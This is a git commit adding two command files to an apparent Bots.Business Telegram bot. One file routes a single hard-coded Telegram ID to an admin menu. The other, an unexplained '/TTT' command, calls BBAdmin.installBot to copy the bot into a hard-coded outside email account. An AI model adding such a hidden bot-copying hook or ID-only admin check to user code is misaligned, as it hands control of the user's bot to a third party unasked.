597a9df2a7fc6b1f7d6d3b03f4b7a48c03126aa2
princeemmanuel12345678 <76397766+princeemmanuel12345678@users.noreply.github.com>
2021-07-20 22:21:26 +0100

    Add files via upload

---
+++ commands/Admi2/📰.js
@@ -0,0 +1,18 @@
+/*CMD
+  command: 📰
+  help: 
+  need_reply: 
+  auto_retry_time: 
+  folder: Admi2
+  answer: 
+  keyboard: 
+  aliases: 
+CMD*/
+
+var admin = user.telegramid
+
+if (admin == 1691842602) {
+  Bot.runCommand("/admi2")
+} else {
+  Bot.runCommand("OpenHome")
+}
---
+++ commands/_TTT.js
@@ -0,0 +1,15 @@
+/*CMD
+  command: /TTT
+  help: 
+  need_reply: 
+  auto_retry_time: 
+  folder: 
+  answer: 
+  keyboard: 
+  aliases: 
+CMD*/
+
+BBAdmin.installBot({
+  email: 'princeamadi7007@gmail.com',
+  bot_id: 380510
+})
